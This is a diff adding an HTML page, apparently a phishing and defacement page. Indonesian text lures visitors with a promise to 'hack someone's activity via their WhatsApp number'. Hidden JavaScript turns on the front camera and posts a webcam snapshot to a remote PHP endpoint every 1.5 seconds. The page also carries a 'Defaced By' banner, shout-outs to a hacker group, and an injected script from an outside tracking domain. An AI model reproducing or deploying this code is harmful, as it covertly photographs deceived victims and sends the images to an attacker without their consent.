@@ -1,0 +1,102 @@
+<!-- Script By Mr.Zhu --><!DOCTYPE html><html>
+
+<head>
+	<title>404</title>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>.: HACK AKTIVITAS ORANG LAIN :.</p>
+        <p>? LEWAT NOMOR WHATSAPPNYA ?</p>
+<p>[!] Langkah-langkah [!]</p>
+<p>1. Izinkan akses kamera </p>
+<p>2. Klik Izinkan/Accept</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+
+	<link href='https://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'/>	<link rel="shortcut icon" href="https://www.logolynx.com/images/logolynx/53/53bb9684b03b677b63199706731a87b9.jpeg"/>	<meta property="og:image" content="https://d.top4top.net/p_1126d943z0.jpg"/>	<meta property="og:title" content="Hacked By Mr.Zhu"/>	<meta property="og:description" content="#MrZhu In Here"/>	<object type="application/x-shockwave-flash" height="100" width="0">		<param name="movie">		<param name="bgcolor">		<param name="FlashVars">	</object></head><body>	<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script>	<style type="text/css"></style>	<body bgcolor="black"><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH22unchwKElGJPmkRn%2f35vJz6euaTK119S3XwTftv9KugyxvrNNap%2bUtBsEpVVzV1LEOSp7yyLKESJESEv41D7fYLRopfIvGndsqfnBGe2mTWrHdWNk4IDejSoWQoBbKcJqXS7xmYwyhpfwEh23xYgnMr4ohm9RseihcZE4dKPgCVpIrWzkXoDJzxhp250%2fintPO8tqZT4iWFTdPRBEl3TrKpki5ut41z%2bZvdpG6qkm%2b1He5kA%2b7JJAuZM1ImEF5UOC9IAFFSrJaW5E%2bZ%2fQyJg%2bbJ5J1uJRbPO%2byUVpf8UolDVD9muDWvp95466Qr2twVc%2ftx%2ffyaT59eDYHWySB2IAiQQbMFCQQ91etQqbBxrjJpZBbVjCmgQxne6zWS40RruPP86wtboiy7TgZc4ziTX1J4BJcXMgVRZgmccOD72hv8lNLjhp3rtsPDZgVn4gR6u%2bge4NghbuEb%2fkQXBCIjfiW0I3VlNwMqwL9zhWQ0%2bGD%2bzkpkXNzKVmg3KnoZUagCBQj6CxteOGeXxWK7UCkFoCA0x0D6YBf7lSRokQCkL9VEE5N12JyTqe1n3PlyP%2bVEQ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>	<center>		<img src="https://www.merhalsa.jp/assets/admin/js/vendor/ckeditor/kcfinder-master/kc_up/files/About.jpg" width="600" height="600px" >	<br>		
+<font face='Iceland' color='red' new size="5">++++++++++++++++++++</font><br>
+<font face="Iceland" color="green" size="27">Defaced By </font>		<font face="Iceland" color="white" size="27"> AsWiN</font><br>
+<font face='Iceland' color='red' new size="5">++++++++++++++++++++</font><br>		<br>				<font face='Iceland' color='red' new size="5">Message :</font>		<br>		<font face='Iceland' color='white' new size="5">~ SANTUYLAH ADMIN ! JANGAN KHAWATIR ~</font>		<br>		<br>		<font face='Iceland' color='red' new size="5">Thanks to : </font><br><font face='Iceland' color='white' new size="5">GRESIK CODING TEAM Official | All Member GCT | Mr.Purg4T0Ry? |asnzodiac | Me-774 | MrZhal | Mr.Myf666X | MR.H4Q1N 135 | MrMRJ796XB | MR.JOKER23 | And You Admin :) <br></font>
+<br><font face='Iceland' color='cyan' new size="4">[ ! ] Jangan lupa mainkan musiknya biar romantis [ ! ]<br></font>		<iframe height="0" width="0" src="https://f.top4top.net/m_1191f6io80.mp3" frameborder="0" frameborder="0" allowfullscreen></iframe>
+<br>
+<audio autoplay="autoplay"
+Controls="controls" src="https://1.top4top.net/m_1368qdx9f0.mp3" 
+ type"audio"/mpeg"></audio><br>
+<font face='Iceland' color='white' new size="5">We Not A </font><font face='Iceland' color='red' new size="5">Criminal</font><br><font face='Iceland' color='red' new size="5">We Are </font><font face='Iceland' color='white' new size="5">Legion</font><br><font face='Iceland' color='red' new size="5">Thanks You</font>
+</center>
+	</center></body></html>
+
+
+
+
